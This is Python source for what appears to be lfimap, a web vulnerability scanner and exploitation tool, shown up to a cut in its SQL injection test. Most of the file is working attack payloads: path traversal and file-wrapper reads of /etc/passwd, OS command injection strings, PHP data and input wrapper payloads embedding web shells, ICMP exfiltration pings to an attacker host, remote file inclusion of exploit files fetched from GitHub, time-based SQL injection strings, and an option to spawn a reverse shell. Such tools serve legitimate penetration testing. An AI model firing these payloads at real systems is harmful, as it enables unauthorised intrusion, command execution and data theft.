#!/usr/bin/env python3

import os
import sys
import re
import socket
import subprocess
import time
import random
import base64
import argparse
import requests
import requests.exceptions
import threading
import http.client
import http.server
import socketserver
import traceback
import errno
import fileinput
import urllib.parse as urlparse
import urllib3

from urllib.parse import unquote
from contextlib import closing
from argparse import RawTextHelpFormatter
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

exploits = []
proxies = {}
rfi_test_port = 8000
scriptName = ""
tempArg = ""
webDir = ""
skipsqli = False
stats = {}
stats["headRequests"] = 0
stats["getRequests"] = 0
stats["postRequests"] = 0
stats["info"] = 0
stats["vulns"] = 0
stats["urls"] = 0
    
#Add them from the most complex one to the least complex. This is important.
TO_REPLACE = ["<IMG sRC=X onerror=jaVaScRipT:alert`xss`>", "<img src=x onerror=javascript:alert`xss`>",
            "%3CIMG%20sRC%3DX%20onerror%3DjaVaScRipT%3Aalert%60xss%60%3E",
            "%253CIMG%2520sRC%253DX%2520onerror%253DjaVaScRipT%253Aalert%2560xss%2560%253E",
            'aahgpz"ptz>e<atzf', "aahgpz%22ptz%3Ee%3Catzf",
            "Windows/System32/drivers/etc/hosts", "C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts",
            "file://C:\Windows\System32\drivers\etc\hosts", "%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts",
            "C:\Windows\System32\drivers\etc\hosts", "Windows\\System32\\drivers\\etc\\hosts",
            "%windir%\System32\drivers\etc\hosts",

            "file%3A%2F%2F%2Fetc%2Fpasswd%2500", "file%3A%2F%2F%2Fetc%2Fpasswd",
            "cat%24IFS%2Fetc%2Fpasswd", "cat${IFS%??}/etc/passwd", "/sbin/cat%20/etc/passwd",
            "/sbin/cat /etc/passwd", "cat%20%2Fetc%2Fpasswd",
            "cat /etc/passwd", "%2Fetc%2Fpasswd", "/etc/passwd",
            "ysvznc", "ipconfig",
            ]

KEY_WORDS = ["root:x:0:0", "<IMG sRC=X onerror=jaVaScRipT:alert`xss`>",
            "<img src=x onerror=javascript:alert`xss`>",
            "cm9vdDp4OjA", "Ond3dy1kYX", "ebbg:k:0:0", "d3d3LWRhdG", "aahgpz\"ptz>e<atzf",
            "jjj-qngn:k", "daemon:x:1:", "r o o t : x : 0 : 0", "ZGFlbW9uOng6",
            "; for 16-bit app support", "sample HOSTS file used by Microsoft",
            "iBvIG8gdCA6IHggOiA", "OyBmb3IgMTYtYml0IGFwcCBzdXBw", "c2FtcGxlIEhPU1RTIGZpbGUgIHVzZWQgYnkgTWljcm9zb2", 
            "Windows IP Configuration", "OyBmb3IgMT", "; sbe 16-ovg ncc fhccbeg",
            "; sbe 16-ovg ncc fhccbeg", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
             ";  f o r  1 6 - b i t  a p p", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
            "c2FtcGxlIEhPU1RT", "=1943785348b45", "www-data:x", "PD9w",
            "961bb08a95dbc34397248d92352da799", "PCFET0NUWVBFIGh0b",
            "PCFET0N", "PGh0b"]

scriptDirectory = os.path.dirname(__file__)

class ServerHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=webDir, **kwargs)
    def log_message(self, format, *args):
        pass

def serve_forever():
    global webDir

    socketserver.TCPServer.allow_reuse_address = True
    try:
        with socketserver.TCPServer(("", rfi_test_port), ServerHandler) as httpd:
            if(args.verbose):
                print("[i] Opening temporary local web server on port " +  str(rfi_test_port) + " and hosting /exploits that will be used for test inclusion")
            try:
                httpd.serve_forever()
            except:
                httpd.server_close()
    except:
        if(args.verbose):
            print("[i] Cannot setup local web server on port " + str(rfi_test_port) + ", it's in use or unavailable, still trying to include it...")

class ICMPThread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.result = None

    def run(self):
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
            s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
            self.result = False

            while True:
                data, addr = s.recvfrom(1024)
                if(data):
                    self.result = True
        except PermissionError:
            if(args.verbose):
                print("[-] Raw socket access is not allowed. For blind ICMP command injection test, rerun lfimap as admin/sudo with '-c'")

    def getResult(self):
        return self.result

    def setResult(self, boolean):
        self.result = boolean

def base64_encode(string):
    return base64.b64encode(bytes(string, 'utf-8')).decode()

def urlencode(string):
    return urlparse.quote(string, safe='')

def encode(payload):
    if(args.encodings):
        for encoding in args.encodings:
            if(encoding == "B"):
                payload = base64_encode(payload)
            elif(encoding == "U"):
                payload = urlencode(payload)
    return payload

#Used to validate URL(s), before testing happens
def HEAD(url, headersData, proxy):
    stats["headRequests"] += 1
    if(args.proxyAddr): r = requests.head(url, headers = headersData, proxies = proxy, verify = False)
    else: r = requests.head(url, headers = headersData, proxies = proxy, timeout = 5)
    return r

def GET(url, headers, proxy, exploitType, exploitMethod, exploit = False):
    doContinue = True
    res = None

    try:
        if(exploit):
            stats["getRequests"] += 1
            res = requests.get(url, headers = headers, proxies = proxy, verify = False)
        else:
            stats["getRequests"] += 1
            res = requests.get(url, headers = headers, proxies = proxy, verify = False)
            if(init(res, "GET", exploitType, url, "", headers, exploitMethod)):
                doContinue = False
    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting...")
        lfimap_cleanup()
    except requests.exceptions.InvalidSchema:
        print("InvalidSchema exception detected. Server doesn't understand the parameter value.")
    except:
        raise

    return res, doContinue

def POST(url, headersData, postData, proxy, exploitType, exploitMethod, exploit = False):
    doContinue = True
    res = None

    try:
        if(exploit):
            res = requests.post(url, data=postData, headers = headersData, proxies = proxy, verify = False)
        else:
            stats["postRequests"] += 1
            res = requests.post(url, data=postData, headers = headersData, proxies = proxy, verify = False)
            if(init(res, "POST", exploitType, url, postData, headersData, exploitMethod)):
                doContinue = False
    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting...")
        lfimap_cleanup()
    except requests.exceptions.InvalidSchema:
        print("InvalidSchema exception detected. Server doesn't understand the parameter value.")
    except:
        raise

    return res, doContinue


def prepareHeaders():
    user_agents = [
            "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
            "Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)",
            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)",
            "Mozilla/3.01 (Macintosh; PPC)",
            "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",
            "Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",
            "Opera/8.00 (Windows NT 5.1; U; en)",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
            ]                                                                                                                                                                             
    headers = {}

    if(args.agent):
        headers['User-Agent'] = agent                                                                                                                                                     
    else:                                                                                                                                                                    
        headers['User-Agent'] = random.choice(user_agents)                                                                                                                                      
    if(args.referer):
        headers['Referer'] = referer

    headers['Accept'] = '*/*'
    headers['Connection'] = 'Close'
    return headers


def addHeader(newKey, newVal):
    headers[newKey] = newVal

def delHeader(key):
    headers.pop(key)

def addToExploits(req, request_type, exploit_type, getVal, postVal, headers, attackType, os):
    global exploits
    e = {}
    e['REQUEST_TYPE'] = request_type
    e['EXPLOIT_TYPE'] = exploit_type
    e['GETVAL'] = getVal
    e['POSTVAL'] = postVal
    e['HEADERS'] = req.headers
    e['ATTACK_METHOD'] = attackType
    e['OS'] = os
    exploits.append(e)
    return e

def init(req, reqType, explType, getVal, postVal, headers, attackType, cmdInjectable = False):


    if(scriptName != ""):
        TO_REPLACE.append(scriptName)
        TO_REPLACE.append(scriptName+".php")
        TO_REPLACE.append(scriptName+"%00")


    if(args.lhost != None):
        TO_REPLACE.append("ping%20-c%201 " + args.lhost)
        TO_REPLACE.append("ping%20-c%201%20" + args.lhost)
        TO_REPLACE.append("ping%20-n%201%20" + args.lhost)
        TO_REPLACE.append("ping%20-n%201%20" + args.lhost)
        TO_REPLACE.append("test%3Bping%24%7BIFS%25%3F%3F%7D-n%24%7BIFS%25%3F%3F%7D1%24%7BIFS%25%3F%3F%7D{0}%3B".format(args.lhost))

    if(checkPayload(req) or cmdInjectable):
        for i in range(len(TO_REPLACE)):
            if(getVal.find(TO_REPLACE[i]) > -1 or postVal.find(TO_REPLACE[i]) > -1 or getVal.find("?c=" + TO_REPLACE[i]) > -1):
                u = getVal.replace(TO_REPLACE[i], tempArg)
                p = postVal.replace(TO_REPLACE[i], tempArg)
                if("windows" in TO_REPLACE[i].lower() or "ipconfig" in TO_REPLACE[i].lower() or "Windows IP Configuration" in req.text):
                    os = "windows"
                else: os = "linux"
                
                exploit = addToExploits(req, reqType, explType, u, p, headers, attackType, os)
                
                #Print finding
                if(postVal == ""):
                    print("[+] " + explType + " -> '" + getVal + "'")
                    stats["vulns"] += 1
                else:
                    print("[+] " + explType + " -> '" + getVal + "' -> HTTP POST -> '" + postVal + "'")
                    stats["vulns"] += 1

                if(args.revshell):
                    pwn(exploit)
                
                if not args.no_stop:
                    return True
                return False

    return False


def test_file_trunc(url):
    if(args.verbose):
        print("[i] Testing file wrapper inclusion...")
    
    tests = []
    tests.append("file%3A%2F%2F%2Fetc%2Fpasswd")
    tests.append("file%3A%2F%2F%2Fetc%2Fpasswd%2500")
    
    tests.append("file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts")
    tests.append("file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts%2500")

    if(not args.postreq):
        for i in range(len(tests)):
            u = url.replace(args.param, encode(tests[i]))
            
            _,br = GET(u, headers, proxies, "LFI", "FILE")
            if(not br): return
    else: 
        for i in range(len(tests)):
            postTest = args.postreq.replace(args.param, encode(tests[i]))
            
            _, br = POST(url, headers, postTest, proxies, "LFI", "FILE")
            if(not br): return

def test_trunc(url):
    if(args.verbose):
        print("[i] Testing path truncation using '" + truncWordlist + "' wordlist...")

    if(not args.postreq):
        with open(truncWordlist, "r") as f:
            for line in f:
                line = line.replace("\n", "")
                u = url.replace(args.param, encode(line))
                
                _, br = GET(u, headers, proxies, "LFI", "TRUNC")
                if(not br): return
    else:
        with open(truncWordlist, "r") as f:
            for line in f:
                line = line.replace("\n", "")

                postTest = args.postreq.replace(args.param, encode(line))
                _, br = POST(url, headers, postTest, proxies, "LFI", "TRUNC")
                if(not br): return
    return

def test_cmd_injection(url):
    if(args.verbose):
        print("[i] Testing for classic results-based os command injection...")
    
    cmdList = []
    cmdList.append("||cat /etc/passwd||")
    cmdList.append(";cat /etc/passwd;")
    cmdList.append("&&cat /etc/passwd||")
    cmdList.append("%3Bcat%20/etc/passwd")
    cmdList.append("%26%26cat%20/etc/passwd")
    cmdList.append("%26cat%20/etc/passwd")
    cmdList.append("%7C%7Ccat%20/etc/passwd%3B")
    cmdList.append("%7C%7Ccat%20/etc/passwd%7C")
    cmdList.append("1;cat${IFS%??}/etc/passwd;")
    cmdList.append("%3Bcat%24IFS%2Fetc%2Fpasswd%3B")
    cmdList.append("printf%20%60cat%20%2Fetc%2Fpasswd%60")
    cmdList.append("&lt;!--#exec%20cmd=&quot;cat%20/etc/passwd&quot;--&gt;")
    cmdList.append("&lt;!--#exec%20cmd=&quot;ipconfig&quot;--&gt;")
    cmdList.append('<!--#exec cmd="cat /etc/passwd"-->')
    cmdList.append('<!--#exec cmd="ipconfig"-->')
    cmdList.append("\n/sbin/cat /etc/passwd\n")    
    cmdList.append(";/sbin/cat /etc/passwd\n")
    cmdList.append("a);cat /etc/passwd;")
    cmdList.append(";system('cat%20/etc/passwd')")
    cmdList.append("%3Bsystem%28%27ipconfig%27%29")
    cmdList.append("%3Bsystem%28%27ipconfig%27%29%3B")
    cmdList.append("%0Acat%20/etc/passwd")
    cmdList.append("%0Acat%20/etc/passwd%0A")
    cmdList.append("$;/sbin/cat /etc/passwd||")
    cmdList.append("%0A%0Dcat%20/etc/passwd%0A%0D")
    cmdList.append("$(`cat /etc/passwd`)")
    cmdList.append(";ipconfig;")
    cmdList.append("||ipconfig||")
    cmdList.append("&&ipconfig&&")
    cmdList.append("%3Bipconfig")
    cmdList.append("%3Bipconfig%3B")
    cmdList.append("%3B%3Bipconfig%3B%3B")
    cmdList.append("%26ipconfig")
    cmdList.append("%26ipconfig%26")
    cmdList.append("%26%26ipconfig%26%26")
    cmdList.append("%7Cipconfig")
    cmdList.append("%7Cipconfig%7C")
    cmdList.append("%7C%7Cipconfig%7C%7C")
    
    for test in cmdList:
        if(not args.postreq):
            u = url.replace(args.param, encode(test))
            _, br = GET(u, headers, proxies, "RCE", "CMD")
            if(not br): return
    
        else:
            postTest = args.postreq.replace(args.param, encode(test))
            _, br = POST(url, headers, postTest, proxies, "RCE", "CMD")
            if(not br): return

     # ICMP exfiltration technique
    if(args.lhost):
        if(args.verbose):
            print("[i] Testing for blind OS command injection via ICMP exfiltration...")
            
        t = ICMPThread()
        t.start()

        icmpTests = []
        icmpTests.append(";ping -c 1;" + args.lhost)
        icmpTests.append(";ping -n 1;" + args.lhost)
        icmpTests.append(";ping%24%7BIFS%25%3F%3F%7D-c%24%7BIFS%25%3F%3F%7D1%24%7BIFS%25%3F%3F%7D{0};".format(args.lhost))
        icmpTests.append(";ping%24%7BIFS%25%3F%3F%7D-n%24%7BIFS%25%3F%3F%7D1%24%7BIFS%25%3F%3F%7D{0};".format(args.lhost))
        
        for test in icmpTests:
            if(args.postreq):
                postTest = args.postreq.replace(args.param, encode(test))
                _, br = POST(url, headers, postTest, proxies, "RCE", "CMD")
                if(t.getResult() == True):
                    t.setResult(False)
                    if(not br): return
            else:
                u = url.replace(args.param, encode(test))
                _, br = GET(u, headers, proxies, "RCE", "CMD")
                if(t.getResult() == True):
                    t.setResult(False)
                    if(not br): return

def test_xss(url):
    if(args.verbose):
        print("[i] Testing for XSS...")
    
    xssTest = []
    xssTest.append("%3CIMG%20sRC%3DX%20onerror%3DjaVaScRipT%3Aalert%60xss%60%3E")
    xssTest.append("%253CIMG%2520sRC%253DX%2520onerror%253DjaVaScRipT%253Aalert%2560xss%2560%253E")
    xssTest.append("aahgpz%22ptz%3Ee%3Catzf")
    xssTest.append("aahgpz%2522ptz%253Ee%253Catzf")

    for test in xssTest:
        u = url.replace(args.param, test)
        if(args.postreq): 
            res, br = POST(u, headers, args.postreq.replace(args.param, test), proxies, "XSS", "XSS")
        else:
            res, br = GET(u, headers, proxies, "XSS", "XSS")
        if(unquote(test) in res.text and unquote(test) in KEY_WORDS):
            print("    Value '" + test + "' is reflected.")

            #Check for headers that could potentially prevent XSS and let user know about them
            if('Content-Security-Policy' in res.headers):
                print("[i] CSP could prevent XSS and is set to: '" + res.headers['Content-Security-Policy'] + "'")
            if('X-Content-Type-Options' in res.headers):
                print("[i] X-Content-Type-Options could prevent XSS and is set to: '" + res.headers['X-Content-Type-Options'] + "'")
            print("    Content-Type: " + res.headers['Content-Type']) 
        
            if(not br): return
    return

def test_filter(url):
    if(args.verbose):
        print("[i] Testing filter wrapper...")
    
    global scriptName

    tests = []
    tests.append("php%3A%2F%2Ffilter%2Fresource%3D%2Fetc%2Fpasswd")
    tests.append("php%3A%2F%2Ffilter%2Fresource%3D%2Fetc%2Fpasswd%2500")
    tests.append("php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fetc%2Fpasswd")
    tests.append("php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fetc%2Fpasswd%2500")
        
    tests.append("php%3A%2F%2Ffilter%2Fresource%3D..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts")
    tests.append("p%3A%2F%2Ffilter%2Fresource%3D..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts%2500")
    tests.append("php%3A%2F%2Ffilter%2Fresource%3DC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts") 
    tests.append("php%3A%2F%2Ffilter%2Fresource%3DC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts%2500") 
    
    script = os.path.splitext(os.path.basename(urlparse.urlsplit(url).path))
    scriptName = script[0]
    
    #If '/?=' in url
    if(scriptName == ""):
        scriptName = "index"
    
    tests.append("php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D" + scriptName)
    tests.append("php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D" + scriptName + ".php")
    tests.append("php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D" + scriptName + "%2500")
    
    if(not args.postreq):
        for i in range(len(tests)):
            u = url.replace(args.param, encode(tests[i]))
            _, br = GET(u, headers, proxies, "LFI", "FILTER")
            if(not br): return
    else:
        for i in range(len(tests)):
            postTest = args.postreq.replace(args.param, encode(tests[i]))
            _, br = POST(url, headers, postTest, proxies, "LFI", "FILTER")
            if(not br): return

    return

def test_data(url):
    if(args.verbose):
        print("[i] Testing data wrapper...")

    tests = []
    
    if(not args.postreq):
        tests.append("data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat%20%2Fetc%2Fpasswd")
        tests.append("data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=ipconfig")
        
        for i in range(len(tests)):
            u = url.replace(args.param, encode(tests[i]))
            _, br = GET(u, headers, proxies, "RCE", "DATA")
            if(not br): return
    else:
        urls = []
        urls.append("?c=cat%20%2Fetc%2Fpasswd")
        urls.append("?c=ipconfig")

        test = "data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K"

        for i in range(len(urls)):
            postTest = args.postreq.replace(args.param, encode(test))
            _, br = POST(url + encode(urls[i]), headers, postTest, proxies, "RCE", "DATA")
            if(not br): return
    return

def test_input(url):
    if(args.postreq):
        if(args.verbose): print("[i] POST arguments are not expoitable using input wrapper. Skipping input wrapper test...")
        return

    if(args.verbose):
        print("[i] Testing input wrapper...")

    tests = []
    tests.append("php%3a%2f%2finput&cmd=cat%20%2Fetc%2Fpasswd")

    tests.append("php%3a%2f%2finput&cmd=ipconfig")
    
    posts = []
    posts.append("<?php echo(shell_exec($_GET['cmd']));?>")
    posts.append("<?php echo(passthru($_GET['cmd']));?>")
    posts.append("<?php echo(system($_GET['cmd']));?>")
    
    for i in range(len(tests)):
        u = url.replace(args.param, encode(tests[i]))
        for j in range(len(posts)):
            _, br = POST(u, headers, encode(posts[j]), proxies, "RCE", "INPUT")
            if(not br): return
    return


def test_expect(url):
    if(args.verbose):
            print("[i] Testing expect wrapper...")

    tests = []
    tests.append("expect%3A%2F%2Fcat%20%2Fetc%2Fpasswd")
    tests.append("expect%3A%2F%2Fipconfig")

    if(not args.postreq):
        for i in range(len(tests)):
            u = url.replace(args.param, encode(tests[i]))

            _, br = GET(u, headers, proxies, "RCE", "EXPECT")
            if(not br): return
    else:
        for i in range(len(tests)):
            postTest = args.postreq.replace(args.param, encode(tests[i]))
            _, br = POST(url, headers, postTest, proxies, "RCE", "EXPECT")
            if(not br):  return
    return

def test_rfi(url):
    global webDir

    if(args.verbose):
        print("[i] Testing remote file inclusion...")
    
    #Localhost RFI test
    if(args.lhost):
        try:  
            # Setup exploit serving path
            if(os.access(scriptDirectory + "/exploits", os.R_OK)):
                webDir = scriptDirectory + "/exploits" 
            else:
                print("Directory '" + scriptDirectory + "/exploits' can't be accessed. Cannot setup local web server for RFI test.")
                return

            threading.Thread(target=serve_forever).start()
            rfiTest = []
            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc".format(args.lhost, str(rfi_test_port)))
            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc%00".format(args.lhost, str(rfi_test_port)))
            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.gif".format(args.lhost, str(rfi_test_port))) 
            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.png".format(args.lhost, str(rfi_test_port))) 
            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.jpg".format(args.lhost, str(rfi_test_port))) 
            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.jsp".format(args.lhost, str(rfi_test_port))) 
            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.html".format(args.lhost, str(rfi_test_port))) 
            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.php".format(args.lhost, str(rfi_test_port))) 

            for test in rfiTest:
                u = url.replace(args.param, encode(test))

                if(not args.postreq):
                    _, br = GET(u, headers, proxies, "RFI", "RFI")
                    if(not br): return
                else:
                    postTest = args.postreq.replace(args.param, encode(test))
                    _, br = POST(url, headers, postTest, proxies, "RFI", "RFI")
                    if(not br): return
        except:
            raise
            pass

    #Internet RFI test
    pylds = []
    pylds.append("https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.gif")
    pylds.append("https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.png")
    pylds.append("https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.jpg")
    pylds.append("https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.html")
    pylds.append("https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.jsp")
    pylds.append("https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.php")
    
    for pyld in pylds: 
        try:
            if(not args.postreq):
                u = url.replace(args.param, encode(pyld))
                _, br = GET(u, headers, proxies, "RFI", "RFI")
                if(not br): return
            else:
                postTest = args.postreq.replace(args.param, encode(pyld))
                _, br = POST(url, headers, postTest, proxies, "RFI", "RFI")
                if(not br): return
        except:
            pass

def test_heuristics(url):
    if(args.verbose):
        print("\n[i] Testing for info disclosure using heuristics...")
    
    #TODO
    # First test with user provided URL -> In future when PWN will not be mandatory in the URLs.
    # Also test with following payloads and compare these responses with original one. If one of this errors is shown in responses, flag them as positive match.
    # If errors are shown with original user-provided URL and are shown with the following requests, flag them as false-positives.
    #
    # Also, test for other databases, not just mysql.
    #
    
    tests = []
    # /?!%$$%!?/
    tests.append("%2F%3F%21%25%24%24%25%21%3F%2F")
    
    fiErrors = ["warning", "include(", "require(", "fopen(", "fpassthru(", "readfile(", "fread(", "fgets("]
    sqlErrors = ["you have an error in your sql syntax", "unclosed qutation mask after the character string",
            "you have an error in your sql syntax", "mysql_query(", "mysql_fetch_array(", 
            "mysql_fetch_assoc(", "mysql_fetch_field(", "mysql_fetch_field_direct(", "mysql_fetch_lengths(", 
            "mysql_fetch_object(", "mysql_fetch_row(", "mysql_fetch_all(", "mysql_prepare(", "mysql_info(",
            "mysql_real_query(", "mysql_stmt_init(", "mysql_stmt_execute(" 
            ]
    temp = headers.copy()
    temp['User-Agent'] = "lfimap<>ua"
    temp['Referer'] = "lfimap<>referer"


    if(not args.postreq):
        for test in tests:
            u = url.replace(args.param, test)
            res, _ = GET(u, headers, proxies, "INFO", "INFO")
            if(fiErrors[0] in res.text.lower()):
                for i in range(1,len(fiErrors)):
                    if(fiErrors[i] in res.text.lower()):
                        if("c:" in res.text or "d:" in res.text.lower() or "windows" in res.text.lower()):
                            print("[i] Detected windows OS signatures, based on response.")
                        print("[+] Info disclosure -> '" + fiErrors[i] + "' error triggered -> '" + u + "'")
                        stats["info"] += 1
                        break

            # Check for Sql errors
            for i in range(len(sqlErrors)):
                if(sqlErrors[i] in res.text.lower()):
                    print("[+] Info disclosure -> '" + sqlErrors[i] + "' error detected -> '" + u + "'")
                    stats["info"] += 1
                    break
    else:
        for test in tests:
            postTest = args.postreq.replace(args.param, test)
            res, _ = POST(url, headers, postTest, proxies, "INFO", "INFO")
            if(fiErrors[0] in res.text.lower()):
                for i in range(1, len(fiErrors)):
                    if(fiErrors[i] in res.text.lower()):
                        if("/php" in res.text.lower()):
                            print("[i] Detected linux OS signatures, based on response.")
                        print("[+] Info disclosure -> '" + fiErrors[i] + "' triggered -> '" + url + "' -> HTTP POST -> '" + postTest + "'")
                        stats["info"] += 1
                        break

            # Check for Sql errors
            for i in range(len(sqlErrors)):
                if(sqlErrors[i] in res.text.lower()):
                    print("[+] Info disclosure -> '" + sqlErrors[i] + "' error detected -> '" + u + "'")
                    stats["info"] += 1
                    break

    if("Server" in res.headers):
        print("[+] Info disclosure -> Web server version: " + res.headers['Server'])
        stats["info"] += 1
    
    resHeaders = "".join(res.headers).lower()
    if("x-powered-by" in resHeaders):
        print("[+] Info disclosure -> Underlying web server languages: " + res.headers['X-Powered-By'])
        stats["info"] += 1
    if("phpsessid" in resHeaders):  
        print("[+] Discovered possible PHP signatures.")
        stats["info"] += 1
    if("jsessid" in resHeaders or "jsessionid" in resHeaders):
        print("[+] Discovered possible JAVA signatures.")
        stats["info"] += 1
    if("aspnet" in resHeaders):
        print("[+] Discovered possible .NET signatures.")
        stats["info"] += 1
    if("lfimap<>ua" in res.text):
        print("[+] Possible XSS, reflected 'User-Agent' string discovered in response.")
        stats["info"] += 1
    if("lfimap<>referer" in res.text):
        print("[+] Possible XSS, reflected 'Referer' string discovered in response.")
        stats["info"] += 1
    if("/?!%$$%!?/" in res.text):
        if(args.test_all or args.xss):  
            print("[+] Possible XSS -> '" + u + "' -> reflection of '/?!%$$%!?/' is discovered in response.")
        else: print("[+] Possible XSS -> '" + u + "' -> reflection of '/?!%$$%!?/' is discovered in response. Rerun lfimap with '--xss' to test for XSS.")
    return

def test_sqli(url):
    if(args.verbose):
        print("[i] Testing for blind SQL injection...")
    
    sqli = []
    sqli.append("1%3BSELECT%20SLEEP%285%29%23")
    sqli.append("1%3BSELECT%20SLEEP%285%29")
    sqli.append("1%20AND%20SLEEP%285%29")
    sqli.append("1%20OR%20SLEEP%285%29")
    sqli.append("1%20AND%20SLEEP%285%29%23")
    sqli.append("1%20RLIKE%20SLEEP%285%29")
    sqli.append("%22%20or%20sleep%285%29%23")
    sqli.append("%27%20or%20sleep%285%29%23")
    sqli.append("%22%20or%20sleep%285%29%23")
    sqli.append("%27%20or%20sleep%285%29%23")
    sqli.append("%22%20or%20sleep%285%29%3D%22")
    sqli.append("%27%20or%20sleep%285%29%3D%27")
    sqli.append("1%29%20or%20sleep%285%29%23")
    sqli.append("1%27%20or%20sleep%285%29%20--%20-")
    sqli.append("%22%29%20or%20sleep%285%29%3D%22")
    sqli.append("%27%29%20or%20sleep%285%29%3D%27")
    sqli.append("1%29%29%20or%20sleep%285%29%23")
    sqli.append("%22%29%29%20or%20sleep%285%29%3D%22")
    sqli.append("%27%29%29%20or%20sleep%285%29%3D%27")
    sqli.append("%3Bwaitfor%20delay%20%270%3A0%3A5%27--%20-")
    sqli.append("%29%3Bwaitfor%20delay%20%270%3A0%3A5%27--%20-")
    sqli.append("%27%3Bwaitfor%20delay%20%270%3A0%3A5%27--%20-")
    sqli.append("%27%29%3Bwaitfor%20delay%20%270%3A0%3A5%27--%20-")
    sqli.append("%22%29%3Bwaitfor%20delay%20%270%3A0%3A5%27--%20-")
    sqli.append("%29%29%3Bwaitfor%20delay%20%270%3A0%3A5%27--%20-")
    sqli.append("%27%29%29%3Bwaitfor%20delay%20%270%3A0%3A5%27--%20-")
    sqli.append("AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29bAKL%29%20AND%20%27vRxe%27%3D%27vRxe")
    sqli.append("AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29YjoC%29%20AND%20%27%25%27%3D%27")
    sqli.append("AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29nQIP%29")
    sqli.append("SLEEP%285%29%23")
    sqli.append("SLEEP%285%29--")
    sqli.append("SLEEP%285%29%3D%22")
    sqli.append("SLEEP%285%29%3D%27")
    sqli.append("1%20or%20SLEEP%285%29")
    sqli.append("1%20or%20SLEEP%285%29%23")
    sqli.append("1%20or%20SLEEP%285%29--")
    sqli.append("1%20or%20SLEEP%285%29%3D%22")
    sqli.append("1%20or%20SLEEP%285%29%3D%27")
    sqli.append("1%20or%20SLEESLEEPP%285%29%2523--%20-%27")
    sqli.append("1%20or%20SLEESLEEPP%285%29%3D%27")
    sqli.append("%22or%20SLEESLEEPP%285%29%2523--%20-%27")

    timeSum = 0
    # GET baseline response time
    for i in range(2):
        if(args.postreq):
            baselineReq, _ = POST(url, headers, args.postreq, proxies, "SQLI", "SQLI")
        else:
            baselineReq, _ = GET(url, headers, proxies, "SQLI", "SQLI")
        
        timeSum += baselineReq.elapsed.total_seconds()
    
    averageTime = timeSum / 2.0
    
    for test in sqli:
        if(args.postreq):
            r, br = POST(url, headers, args.postreq.replace(args.param, encode(test)), proxies, "SQLI", "SQLI")
        else:
            r, br = GET(url.replace(args.param, encode(test)), headers, proxies, "SQLI", "SQLI")
        
        rTime = r.elapsed.total_seconds()
